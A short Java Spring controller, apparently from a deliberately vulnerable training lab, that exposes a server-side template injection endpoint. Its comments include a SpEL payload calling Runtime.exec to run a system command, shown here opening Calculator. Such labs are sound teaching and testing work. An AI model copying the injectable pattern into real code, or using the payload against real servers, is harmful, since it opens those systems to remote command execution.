package com.ffffffff0x.exploit;

import io.swagger.annotations.Api;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.ui.ModelMap;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;

@Api(tags = "SSTI+SpEL")
@Slf4j
@Controller
public class SSTI {

    // 测试
    // http://127.0.0.1:8999/sstitest?hello=f0x
    @GetMapping("/sstitest")
    public String test(String hello, ModelMap map) {
        map.addAttribute("text", hello);
        return "sstitest";
    }

    // ssti (记得吧 payload url 编码一下)
    // http://127.0.0.1:8999/ssti?name=1&name2=1
    // 触发 http://127.0.0.1:8999/ssti?name=${T(java.lang.Runtime).getRuntime().exec("open -a Calculator")}&name2=1
    // 不触发 http://127.0.0.1:8999/ssti?name=1&name2=${T(java.lang.Runtime).getRuntime().exec("open -a Calculator")}
    @GetMapping("/ssti")
    public String vul(@RequestParam(name="name") String name,@RequestParam(name="name2") String name2, Model model) {
        model.addAttribute("name", name);
        model.addAttribute("name2", name2);
        return "ssti";
    }

}
